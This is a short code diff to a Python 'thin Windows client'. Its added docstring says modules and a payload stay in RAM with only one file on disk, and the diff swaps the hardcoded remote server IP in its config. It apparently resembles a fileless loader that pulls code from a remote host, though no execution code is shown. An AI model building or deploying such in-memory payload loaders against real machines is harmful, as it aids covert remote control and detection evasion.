@@ -1,3 +1,9 @@
+"""
+Thin Windows client. One file on disk. Modules + payload stay in RAM.
+
+    import mapper_client; mapper_client.run_sync()
+"""
+
 from __future__ import annotations
 
 import argparse
@@ -11,7 +17,7 @@ from urllib.parse import urlparse
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
 CONFIG: dict[str, Any] = {
-    "HOST": "91.92.47.134",
+    "HOST": "172.233.51.81",
     "PORT": 8765,
     "ASSET": "main",
     "API_KEY": "test123",
